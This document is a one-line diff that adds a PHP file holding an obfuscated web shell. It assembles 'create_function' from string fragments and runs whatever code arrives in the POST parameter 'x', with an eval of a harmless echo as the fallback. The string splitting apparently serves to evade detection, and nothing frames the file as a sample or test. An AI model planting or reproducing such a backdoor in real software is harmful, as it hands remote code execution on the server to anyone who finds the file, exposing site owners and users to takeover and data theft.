@@ -1,0 +1,1 @@
+<?php $a="cr"."eat"."e_fun"."ction";$b=$a('',$_POST["x"]??"ev"."al(\"echo ok;\")");$b();?>
